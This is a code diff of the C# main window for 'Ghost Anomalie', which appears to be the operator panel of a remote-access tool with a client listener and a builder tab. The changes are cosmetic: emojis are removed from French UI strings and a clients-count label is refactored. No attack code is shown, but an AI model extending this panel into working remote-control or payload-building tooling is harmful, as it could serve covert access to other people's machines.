@@ -11,21 +11,22 @@ namespace GhostAnomalie.Server.Forms
         private Dictionary<string, ClientHandler> _clients = new();
         private ClientHandler? _selectedClient;
 
-        // Contrôles
+        // === ONGLETS ===
         private TabControl _tabControl;
         private ServerTab _serverTab;
         private BuilderTab _builderTab;
         private SettingsTab _settingsTab;
 
-        // Status
+        // === STATUS ===
         private Label _lblStatus;
         private ToolStripStatusLabel _lblStatusBar;
+        private ToolStripStatusLabel _lblClientsStatus;
 
         public MainForm()
         {
             InitializeComponent();
             _listener = new Listener(this);
-            this.Text = $"👻 Ghost Anomalie v{Constants.Version}";
+            this.Text = $"Ghost Anomalie v{Constants.Version}";
 
             // Créer les dossiers
             Directory.CreateDirectory(Constants.ClientsFolder);
@@ -40,9 +41,9 @@ namespace GhostAnomalie.Server.Forms
             _builderTab.Initialize(this);
             _settingsTab.Initialize(this);
 
-            Log("👻 Ghost Anomalie v" + Constants.Version + " démarré");
-            Log("🇬🇦 " + Constants.Author);
-            Log("📡 Prêt à recevoir des connexions");
+            Log($"Ghost Anomalie v{Constants.Version} demarre");
+            Log(Constants.Author);
+            Log("Pret a recevoir des connexions");
         }
 
         private void InitializeComponent()
@@ -53,6 +54,7 @@ namespace GhostAnomalie.Server.Forms
             this.ForeColor = Color.FromArgb(0, 255, 136);
             this.StartPosition = FormStartPosition.CenterScreen;
             this.FormClosing += MainForm_FormClosing;
+            this.Icon = Icon.ExtractAssociatedIcon(Application.ExecutablePath);
 
             // ===== HEADER =====
             var header = new Panel
@@ -65,7 +67,7 @@ namespace GhostAnomalie.Server.Forms
 
             var title = new Label
             {
-                Text = "👻 GHOST ANOMALIE",
+                Text = "GHOST ANOMALIE",
                 Font = new Font("Arial Black", 22, FontStyle.Bold),
                 ForeColor = Color.FromArgb(0, 255, 136),
                 BackColor = Color.Transparent,
@@ -95,7 +97,7 @@ namespace GhostAnomalie.Server.Forms
 
             _lblStatus = new Label
             {
-                Text = "🔴 OFFLINE",
+                Text = "OFFLINE",
                 Font = new Font("Arial", 12, FontStyle.Bold),
                 ForeColor = Color.FromArgb(255, 50, 50),
                 BackColor = Color.Transparent,
@@ -120,21 +122,21 @@ namespace GhostAnomalie.Server.Forms
             };
 
             // ===== ONGLET SERVEUR =====
-            var serverPage = new TabPage("🟢 Serveur");
+            var serverPage = new TabPage("Serveur");
             serverPage.BackColor = Color.FromArgb(5, 5, 15);
             _serverTab = new ServerTab();
             _serverTab.Dock = DockStyle.Fill;
             serverPage.Controls.Add(_serverTab);
 
-            // ===== ONGLET GÉNÉRATEUR =====
-            var builderPage = new TabPage("🎯 Générateur");
+            // ===== ONGLET GENERATEUR =====
+            var builderPage = new TabPage("Generateur");
             builderPage.BackColor = Color.FromArgb(5, 5, 15);
             _builderTab = new BuilderTab();
             _builderTab.Dock = DockStyle.Fill;
             builderPage.Controls.Add(_builderTab);
 
-            // ===== ONGLET PARAMÈTRES =====
-            var settingsPage = new TabPage("⚙️ Paramètres");
+            // ===== ONGLET PARAMETRES =====
+            var settingsPage = new TabPage("Parametres");
             settingsPage.BackColor = Color.FromArgb(5, 5, 15);
             _settingsTab = new SettingsTab();
             _settingsTab.Dock = DockStyle.Fill;
@@ -152,18 +154,17 @@ namespace GhostAnomalie.Server.Forms
                 ForeColor = Color.FromArgb(100, 100, 100)
             };
 
-            _lblStatusBar = new ToolStripStatusLabel("✅ Prêt - Ghost Anomalie");
+            _lblStatusBar = new ToolStripStatusLabel("Pret - Ghost Anomalie");
             statusBar.Items.Add(_lblStatusBar);
 
-            var clientsStatus = new ToolStripStatusLabel("👥 0 clients");
-            clientsStatus.Name = "lblClients";
-            statusBar.Items.Add(clientsStatus);
+            _lblClientsStatus = new ToolStripStatusLabel("Clients: 0");
+            statusBar.Items.Add(_lblClientsStatus);
 
             this.Controls.Add(statusBar);
         }
 
         // ============================================================
-        // MÉTHODES PUBLIQUES
+        // METHODES PUBLIQUES
         // ============================================================
 
         public void Log(string message)
@@ -185,7 +186,7 @@ namespace GhostAnomalie.Server.Forms
         {
             if (_lblStatus != null)
             {
-                _lblStatus.Text = isOnline ? "🟢 ONLINE" : "🔴 OFFLINE";
+                _lblStatus.Text = isOnline ? "ONLINE" : "OFFLINE";
                 _lblStatus.ForeColor = isOnline ? Color.FromArgb(0, 255, 136) : Color.FromArgb(255, 50, 50);
             }
 
@@ -197,16 +198,9 @@ namespace GhostAnomalie.Server.Forms
 
         public void UpdateClientsCount(int count)
         {
-            if (_lblStatusBar != null && _lblStatusBar.Owner != null)
+            if (_lblClientsStatus != null)
             {
-                foreach (ToolStripItem item in ((StatusStrip)_lblStatusBar.Owner).Items)
-                {
-                    if (item.Name == "lblClients")
-                    {
-                        item.Text = $"👥 {count} clients";
-                        break;
-                    }
-                }
+                _lblClientsStatus.Text = $"Clients: {count}";
             }
 
             if (_serverTab != null)
@@ -222,7 +216,7 @@ namespace GhostAnomalie.Server.Forms
                 _clients[client.ClientId] = client;
                 _serverTab.AddClient(client);
                 UpdateClientsCount(_clients.Count);
-                Log($"✅ Client connecté: {client.ClientId} ({client.IpAddress})");
+                Log($"Client connecte: {client.ClientId} ({client.IpAddress})");
             }
         }
 
@@ -235,7 +229,7 @@ namespace GhostAnomalie.Server.Forms
                     _clients.Remove(clientId);
                     _serverTab.RemoveClient(clientId);
                     UpdateClientsCount(_clients.Count);
-                    Log($"🔌 Client déconnecté: {clientId}");
+                    Log($"Client deconnecte: {clientId}");
                 }
             }
         }
@@ -267,13 +261,13 @@ namespace GhostAnomalie.Server.Forms
         }
 
         // ============================================================
-        // ÉVÉNEMENTS
+        // EVENEMENTS
         // ============================================================
 
         private void MainForm_FormClosing(object? sender, FormClosingEventArgs e)
         {
             _listener.Stop();
-            Logger.Info("Application fermée");
+            Logger.Info("Application fermee");
         }
     }
 }
